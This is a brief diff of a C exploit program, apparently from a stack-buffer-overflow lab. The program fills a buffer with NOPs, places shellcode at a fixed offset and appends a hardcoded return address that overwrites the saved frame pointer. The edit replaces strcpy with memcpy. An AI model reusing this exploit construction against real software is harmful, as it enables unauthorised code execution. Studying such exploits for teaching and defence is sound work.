@@ -12,8 +12,10 @@ int main(void) {
   char *env[1];
   char buf[162];
 
+  int shell_len = strlen(shellcode);
+
   memset(buf, NOP, 161);
-  strcpy(buf + 156 - strlen(shellcode), shellcode);
+  memcpy(buf + 156 - shell_len, shellcode, shell_len);
   strcpy(buf + 156, "\x28\xfd\xff\xbf" // expected eip
                     "\xc0");           // overflow to sfp
 
